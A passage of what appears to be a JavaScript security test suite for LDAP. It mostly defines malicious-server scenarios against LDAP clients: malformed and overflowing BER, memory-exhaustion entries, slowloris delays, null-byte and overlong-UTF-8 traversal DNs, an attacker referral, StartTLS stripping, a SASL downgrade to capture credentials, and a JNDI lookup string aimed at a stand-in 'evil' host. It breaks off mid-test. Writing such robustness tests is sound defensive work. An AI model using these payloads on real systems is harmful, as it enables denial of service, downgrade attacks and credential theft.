        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), ''), label: 'EmptyOID' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject empty OID',
  },

  {
    name: 'ldap-extended-txn-start',
    category: 'LI',
    description: 'Transaction start extended operation',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), LDAP_OID.TxnStart), label: 'TxnStart' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should support or reject transactions',
  },

  {
    name: 'ldap-extended-ad-batch',
    category: 'LI',
    description: 'AD Batch request extended operation',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), LDAP_OID.BatchRequest), label: 'ADBatch' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'AD should process batch request or reject',
  },

  {
    name: 'ldap-extended-large-value',
    category: 'LI',
    description: 'Extended request with 1MB value payload',
    side: 'client',
    actions: () => {
      resetMsgId();
      const bigValue = Buffer.alloc(1024 * 1024, 0x41);
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), LDAP_OID.WhoAmI, bigValue), label: 'ExtLargeValue' },
        { type: 'recv', timeout: 10000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject oversized extended request value',
  },


  // ─────────────────────────────────────────────────────────────────────────────
  //  LJ — Server-to-Client Attacks (high)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-server-malformed-bind-response',
    category: 'LJ',
    description: 'Server sends malformed BindResponse with truncated BER',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          sent = true;
          log('Received client data, sending malformed BindResponse');
          const response = Buffer.from([
            0x30, 0x84, 0xFF, 0xFF, 0xFF, 0xFF, // SEQUENCE with 4GB length
            0x02, 0x01, 0x01, // messageID = 1
            0x61, 0x03,       // BindResponse tag, short body
            0x0A, 0x01, 0x00, // resultCode = success
          ]);
          socket.write(response);
          setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Malformed BindResponse sent' }); }, 1000);
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should reject malformed length in BindResponse',
  },

  {
    name: 'ldap-server-referral-injection',
    category: 'LJ',
    description: 'Server injects referral URLs in search results',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            log('BindRequest received, sending success');
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest) {
            log('SearchRequest received, sending referral');
            socket.write(pkt.buildSearchResultReference(parsed.messageID, [
              'ldap://evil.attacker.com/dc=evil,dc=com',
              'ldap://192.168.1.1:389/dc=internal,dc=com',
            ]));
            socket.write(pkt.buildSearchResultDone(parsed.messageID, LDAP_RESULT.referral));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Referral injection sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should validate/restrict referral URLs',
  },

  {
    name: 'ldap-server-oversized-entry',
    category: 'LJ',
    description: 'Server returns search entry with 5MB attribute value',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest) {
            log('Sending oversized search result entry');
            const bigValue = 'X'.repeat(5 * 1024 * 1024);
            socket.write(pkt.buildSearchResultEntry(parsed.messageID,
              'cn=huge,dc=test,dc=com',
              { description: [bigValue] }
            ));
            socket.write(pkt.buildSearchResultDone(parsed.messageID, 0));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Oversized entry sent (5MB)' }); }, 2000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should handle oversized entries without memory exhaustion',
  },

  {
    name: 'ldap-server-infinite-search-stream',
    category: 'LJ',
    description: 'Server sends infinite stream of search result entries',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let streaming = false;
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest && !streaming) {
            streaming = true;
            log('Starting infinite search result stream');
            let count = 0;
            const interval = setInterval(() => {
              if (socket.destroyed || count >= 10000) {
                clearInterval(interval);
                if (!socket.destroyed) {
                  socket.write(pkt.buildSearchResultDone(parsed.messageID, 4));
                  setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: `Streamed ${count} entries` }); }, 1000);
                } else {
                  resolve({ status: 'PASSED', response: `Client disconnected after ${count} entries` });
                }
                return;
              }
              try {
                socket.write(pkt.buildSearchResultEntry(parsed.messageID,
                  `cn=entry${count},dc=test,dc=com`,
                  { cn: [`entry${count}`], sn: ['test'] }
                ));
                count++;
              } catch(e) { clearInterval(interval); resolve({ status: 'PASSED', response: `Client error after ${count} entries` }); }
            }, 1);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should limit received entries or timeout',
  },

  {
    name: 'ldap-server-wrong-message-id',
    category: 'LJ',
    description: 'Server responds with wrong messageID',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            sent = true;
            log(`Responding with wrong messageID (${parsed.messageID + 100})`);
            socket.write(pkt.buildBindResponse(parsed.messageID + 100, 0));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Wrong messageID sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should reject response with mismatched messageID',
  },

  {
    name: 'ldap-server-unsolicited-notification',
    category: 'LJ',
    description: 'Server sends unsolicited notification (messageID=0)',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            sent = true;
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
            log('Sending unsolicited notification');
            socket.write(pkt.buildExtendedResponse(0, LDAP_RESULT.unavailable, '', 'Server shutting down', '1.3.6.1.4.1.1466.20036'));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Unsolicited notification sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should handle unsolicited notifications gracefully',
  },

  {
    name: 'ldap-server-delayed-response',
    category: 'LJ',
    description: 'Server delays response by 15 seconds',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            sent = true;
            log('Delaying BindResponse by 15 seconds');
            setTimeout(() => {
              if (!socket.destroyed) {
                socket.write(pkt.buildBindResponse(parsed.messageID, 0));
                setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Delayed response sent after 15s' }); }, 1000);
              } else {
                resolve({ status: 'PASSED', response: 'Client disconnected before delayed response' });
              }
            }, 15000);
          }
        });
      });
    },
    timeout: 25000,
    expected: 'PASSED',
    expectedReason: 'Client should timeout on delayed responses',
  },

  {
    name: 'ldap-server-garbage-response',
    category: 'LJ',
    description: 'Server responds with random garbage bytes',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          sent = true;
          log('Sending garbage bytes to client');
          socket.write(pkt.buildGarbageMessage(512));
          setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Garbage bytes sent' }); }, 1000);
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should disconnect on invalid response data',
  },

  {
    name: 'ldap-server-multiple-responses',
    category: 'LJ',
    description: 'Server sends multiple BindResponses for one request',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            sent = true;
            log('Sending 5 BindResponses for single request');
            for (let i = 0; i < 5; i++) {
              socket.write(pkt.buildBindResponse(parsed.messageID, 0));
            }
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: '5 duplicate BindResponses sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should handle duplicate responses gracefully',
  },

  {
    name: 'ldap-server-search-result-wrong-dn',
    category: 'LJ',
    description: 'Server returns search entries with DNs outside search base',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest) {
            log('Sending entries outside search base');
            socket.write(pkt.buildSearchResultEntry(parsed.messageID,
              'cn=admin,dc=evil,dc=com',
              { cn: ['admin'], userPassword: ['secretpassword'] }
            ));
            socket.write(pkt.buildSearchResultDone(parsed.messageID, 0));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Wrong-DN entry sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should validate returned DNs against search base',
  },

  {
    name: 'ldap-server-partial-response',
    category: 'LJ',
    description: 'Server sends only first half of BindResponse BER bytes',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            sent = true;
            const response = pkt.buildBindResponse(parsed.messageID, 0);
            const splitAt = Math.floor(response.length / 2);
            const firstHalf = response.slice(0, splitAt);
            log('Sending partial BindResponse (' + splitAt + '/' + response.length + ' bytes)');
            socket.write(firstHalf);
            // Wait for client to timeout, then end
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Partial BindResponse sent' }); }, 5000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should timeout waiting for complete response',
  },


  // ── Additional LJ server-to-client attack scenarios ─────────────────────────

  {
    name: 'ldap-server-ber-depth-bomb',
    category: 'LJ',
    description: 'Server sends deeply nested BER SEQUENCE (500 levels) to crash client parser',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          sent = true;
          log('Sending BER depth bomb (500 nested SEQUENCEs)');
          // Build deeply nested SEQUENCE tags
          const depth = 500;
          const inner = Buffer.from([0x02, 0x01, 0x00]); // INTEGER 0
          let payload = inner;
          for (let i = 0; i < depth; i++) {
            const len = payload.length;
            if (len < 128) {
              payload = Buffer.concat([Buffer.from([0x30, len]), payload]);
            } else {
              const lenBytes = [];
              let l = len;
              while (l > 0) { lenBytes.unshift(l & 0xFF); l >>= 8; }
              payload = Buffer.concat([Buffer.from([0x30, 0x80 | lenBytes.length, ...lenBytes]), payload]);
            }
          }
          socket.write(payload);
          setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: `Depth bomb sent (${depth} levels, ${payload.length} bytes)` }); }, 1000);
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should limit recursion depth in BER parser',
  },

  {
    name: 'ldap-server-ber-integer-overflow',
    category: 'LJ',
    description: 'Server sends BER with length field causing integer overflow (0x7FFFFFFF)',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          sent = true;
          log('Sending BER with overflow length');
          const response = Buffer.from([
            0x30, 0x84, 0x7F, 0xFF, 0xFF, 0xFF, // SEQUENCE with ~2GB length
            0x02, 0x01, 0x01,                     // messageID = 1
            0x61, 0x84, 0x7F, 0xFF, 0xFF, 0xF0,  // BindResponse with overflow length
            0x0A, 0x01, 0x00,                     // resultCode = success
            0x04, 0x00,                           // matchedDN = ""
            0x04, 0x00,                           // diagnosticMessage = ""
          ]);
          socket.write(response);
          setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Integer overflow length sent' }); }, 1000);
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should reject BER with unreasonable lengths',
  },

  {
    name: 'ldap-server-null-byte-dn',
    category: 'LJ',
    description: 'Server returns search entry with null bytes embedded in DN (truncation attack)',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest) {
            log('Sending entry with null-byte DN');
            socket.write(pkt.buildSearchResultEntry(parsed.messageID,
              'cn=admin\x00,ou=evil,dc=attacker,dc=com',
              { cn: ['admin\x00injected'], userPassword: ['stolen\x00data'] }
            ));
            socket.write(pkt.buildSearchResultDone(parsed.messageID, 0));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Null-byte DN entry sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should reject or sanitize null bytes in DNs and attributes',
  },

  {
    name: 'ldap-server-utf8-overlong',
    category: 'LJ',
    description: 'Server sends attributes with UTF-8 overlong encoding (CVE-style bypass)',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest) {
            log('Sending entry with UTF-8 overlong sequences');
            // Overlong encoding of "/" (0x2F) as 0xC0 0xAF and null as 0xC0 0x80
            const overlongDN = Buffer.from('cn=\xC0\xAF\xC0\xAE\xC0\xAE\xC0\xAFetc\xC0\xAFpasswd,dc=test');
            const entry = pkt.buildSearchResultEntry(parsed.messageID,
              overlongDN.toString('binary'),
              { description: ['\xC0\x80\xC0\xAF../..\xC0\xAFsecret'] }
            );
            socket.write(entry);
            socket.write(pkt.buildSearchResultDone(parsed.messageID, 0));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'UTF-8 overlong entry sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should reject invalid UTF-8 sequences',
  },

  {
    name: 'ldap-server-controls-injection',
    category: 'LJ',
    description: 'Server injects unexpected controls in response (paged results, sort, persistent search)',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            log('Sending BindResponse with injected controls');
            // Build BindResponse with controls section
            const bindResp = pkt.buildBindResponse(parsed.messageID, 0);
            // Append a Controls section: SEQUENCE of Control { OID, criticality=true, value }
            const controlOID = '1.2.840.113556.1.4.319'; // pagedResults
            const oidBuf = Buffer.from(controlOID);
            const controlValue = Buffer.alloc(256, 0x41); // Fake paging cookie
            const control = Buffer.concat([
              Buffer.from([0x30, 0x80]), // SEQUENCE indefinite
              Buffer.from([0x04, oidBuf.length]), oidBuf,
              Buffer.from([0x01, 0x01, 0xFF]), // criticality = true
              Buffer.from([0x04, controlValue.length]), controlValue,
              Buffer.from([0x00, 0x00]), // end of indefinite
            ]);
            const controls = Buffer.concat([
              Buffer.from([0xA0, control.length]), control,
            ]);
            socket.write(Buffer.concat([bindResp, controls]));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Controls injected in BindResponse' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should ignore unsolicited controls or validate them',
  },

  {
    name: 'ldap-server-referral-loop',
    category: 'LJ',
    description: 'Server returns referral pointing back to itself (infinite referral loop)',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let referralCount = 0;
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest) {
            referralCount++;
            log(`Sending self-referral #${referralCount}`);
            const port = socket.localPort || 389;
            socket.write(pkt.buildSearchResultReference(parsed.messageID, [
              `ldap://127.0.0.1:${port}/dc=loop,dc=com`,
              `ldap://localhost:${port}/dc=loop,dc=com`,
            ]));
            socket.write(pkt.buildSearchResultDone(parsed.messageID, LDAP_RESULT.referral));
            // End after first referral — real clients that chase referrals will reconnect
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: `${referralCount} self-referrals sent` }); }, 2000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should detect referral loops and limit chase depth',
  },

  {
    name: 'ldap-server-wrong-op-response',
    category: 'LJ',
    description: 'Server responds to BindRequest with SearchResultEntry (wrong operation type)',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            sent = true;
            log('Responding to BindRequest with SearchResultEntry');
            socket.write(pkt.buildSearchResultEntry(parsed.messageID,
              'cn=confused,dc=test,dc=com',
              { cn: ['confused'], description: ['Wrong op response'] }
            ));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Wrong operation type response sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should reject responses with unexpected operation type',
  },

  {
    name: 'ldap-server-slowloris',
    category: 'LJ',
    description: 'Server sends BindResponse one byte at a time over 10 seconds',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            sent = true;
            log('Sending BindResponse byte-by-byte (slowloris)');
            const response = pkt.buildBindResponse(parsed.messageID, 0);
            let i = 0;
            const interval = setInterval(() => {
              if (socket.destroyed || i >= response.length) {
                clearInterval(interval);
                setTimeout(() => {
                  socket.end();
                  resolve({ status: 'PASSED', response: `Slowloris: ${i}/${response.length} bytes sent` });
                }, 500);
                return;
              }
              try { socket.write(Buffer.from([response[i++]])); } catch(e) { clearInterval(interval); resolve({ status: 'PASSED', response: 'Client disconnected during slowloris' }); }
            }, Math.floor(10000 / response.length));
          }
        });
      });
    },
    timeout: 20000,
    expected: 'PASSED',
    expectedReason: 'Client should timeout on excessively slow responses',
  },

  {
    name: 'ldap-server-entry-attribute-bomb',
    category: 'LJ',
    description: 'Server returns entry with 1000 attributes to exhaust client memory/parsing',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest) {
            log('Sending entry with 1000 attributes');
            const attrs = {};
            for (let i = 0; i < 1000; i++) {
              attrs[`customAttr${i}`] = [`value${i}-${'X'.repeat(100)}`];
            }
            socket.write(pkt.buildSearchResultEntry(parsed.messageID,
              'cn=bomb,dc=test,dc=com', attrs
            ));
            socket.write(pkt.buildSearchResultDone(parsed.messageID, 0));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Attribute bomb sent (1000 attrs)' }); }, 2000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should limit attribute count per entry',
  },

  {
    name: 'ldap-server-concurrent-msgid-confusion',
    category: 'LJ',
    description: 'Server sends interleaved responses with multiple messageIDs to confuse client',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            sent = true;
            log('Sending interleaved responses with different messageIDs');
            // Send responses for messageIDs the client never sent
            for (let fakeId = 100; fakeId < 110; fakeId++) {
              socket.write(pkt.buildSearchResultEntry(fakeId,
                `cn=phantom${fakeId},dc=ghost,dc=com`,
                { cn: [`phantom${fakeId}`] }
              ));
            }
            // Now send the actual bind response
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
            // And more phantom responses
            for (let fakeId = 200; fakeId < 205; fakeId++) {
              socket.write(pkt.buildSearchResultDone(fakeId, 0));
            }
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Interleaved phantom responses sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should discard responses with unknown messageIDs',
  },

  {
    name: 'ldap-server-response-after-unbind',
    category: 'LJ',
    description: 'Server sends data after client sends UnbindRequest',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let bound = false;
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            bound = true;
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.UnbindRequest || bound) {
            log('Client unbound/sent data — sending post-unbind data');
            // Send data after unbind — client should not process this
            socket.write(pkt.buildSearchResultEntry(999,
              'cn=post-unbind,dc=evil,dc=com',
              { cn: ['should-not-be-processed'], secret: ['leaked-data'] }
            ));
            socket.write(pkt.buildExtendedResponse(0, 0, '', 'Post-unbind notification', '1.3.6.1.4.1.1466.20036'));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Post-unbind data sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should not process data received after unbind',
  },

  {
    name: 'ldap-server-starttls-downgrade',
    category: 'LJ',
    description: 'Server accepts StartTLS but continues in plaintext (TLS stripping)',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.ExtendedRequest) {
            log('StartTLS requested — sending success but staying in plaintext');
            socket.write(pkt.buildExtendedResponse(parsed.messageID, 0, '', '', '1.3.6.1.4.1.1466.20037'));
            setTimeout(() => {
              if (!socket.destroyed) {
                socket.write(pkt.buildExtendedResponse(0, 0, '', 'Still plaintext!', ''));
              }
              setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'StartTLS downgrade attempted' }); }, 2000);
            }, 1000);
          } else if (parsed.protocolOp === LDAP_OP.BindRequest) {
            // Client didn't request StartTLS — send success then inject fake StartTLS response anyway
            log('No StartTLS requested — sending bind success + fake StartTLS downgrade');
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
            socket.write(pkt.buildExtendedResponse(0, 0, '', 'Fake StartTLS upgrade', '1.3.6.1.4.1.1466.20037'));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'StartTLS downgrade injected after bind' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should verify TLS actually started after StartTLS response',
  },

  {
    name: 'ldap-server-sasl-downgrade',
    category: 'LJ',
    description: 'Server forces PLAIN SASL mechanism to capture credentials',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            sent = true;
            log('Rejecting bind — requesting PLAIN SASL (downgrade)');
            // Reject with authMethodNotSupported + send supportedSASLMechanisms with only PLAIN
            socket.write(pkt.buildBindResponse(parsed.messageID, 7, '', 'Use PLAIN mechanism'));
            // Also send a SearchResultEntry with supportedSASLMechanisms
            socket.write(pkt.buildSearchResultEntry(0, '',
              { supportedSASLMechanisms: ['PLAIN', 'LOGIN'] }
            ));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'SASL downgrade to PLAIN attempted' }); }, 2000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should not downgrade to weak SASL mechanisms',
  },

  {
    name: 'ldap-server-negative-length',
    category: 'LJ',
    description: 'Server sends BER elements with negative/invalid definite lengths',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          sent = true;
          log('Sending BER with negative/invalid lengths');
          // Craft various invalid BER length encodings
          const payloads = [
            Buffer.from([0x30, 0x84, 0x80, 0x00, 0x00, 0x10, 0x02, 0x01, 0x01, 0x61, 0x03, 0x0A, 0x01, 0x00]), // Negative high bit
            Buffer.from([0x30, 0x85, 0x01, 0x00, 0x00, 0x00, 0x10]), // 5-byte length (invalid)
            Buffer.from([0x30, 0x80, 0x02, 0x01, 0x01, 0x61, 0x80, 0x0A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]), // Indefinite length
          ];
          for (const p of payloads) { socket.write(p); }
          setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Invalid BER lengths sent' }); }, 1000);
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should reject invalid BER length encodings',
  },

  {
    name: 'ldap-server-search-entry-multivalue-bomb',
    category: 'LJ',
    description: 'Server returns entry with single attribute having 10000 values',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest) {
            log('Sending entry with 10000 member values');
            const values = [];
            for (let i = 0; i < 10000; i++) values.push(`cn=user${i},ou=groups,dc=test,dc=com`);
            socket.write(pkt.buildSearchResultEntry(parsed.messageID,
              'cn=megagroup,dc=test,dc=com',
              { member: values }
            ));
            socket.write(pkt.buildSearchResultDone(parsed.messageID, 0));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Multi-value bomb sent (10000 values)' }); }, 2000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should handle large multi-value attributes without OOM',
  },

  {
    name: 'ldap-server-zero-length-attribute',
    category: 'LJ',
    description: 'Server returns entries with zero-length attribute names and values',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest) {
            log('Sending entry with zero-length attribute names/values');
            socket.write(pkt.buildSearchResultEntry(parsed.messageID,
              '', // empty DN
              { '': [''], 'cn': [''], '  ': ['value'], 'normal': [''] }
            ));
            socket.write(pkt.buildSearchResultDone(parsed.messageID, 0));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Zero-length attributes sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should handle empty attribute names/values gracefully',
  },

  {
    name: 'ldap-server-paging-cookie-poison',
    category: 'LJ',
    description: 'Server returns malicious paging cookie to exploit client-side deserialization',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        socket.on('data', (data) => {
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          } else if (parsed.protocolOp === LDAP_OP.SearchRequest) {
            log('Sending search results with poisoned paging cookie');
            // Send a few entries
            socket.write(pkt.buildSearchResultEntry(parsed.messageID,
              'cn=entry1,dc=test,dc=com', { cn: ['entry1'] }
            ));
            // Build SearchResultDone with pagedResults control containing malicious cookie
            const pagedOID = Buffer.from('1.2.840.113556.1.4.319');
            // Cookie payload: serialized object attempt, format string, path traversal
            const poisonCookie = Buffer.from('${jndi:ldap://evil/a}|../../../etc/passwd|\x00\xFF\xFE\xFD' + 'A'.repeat(4096));
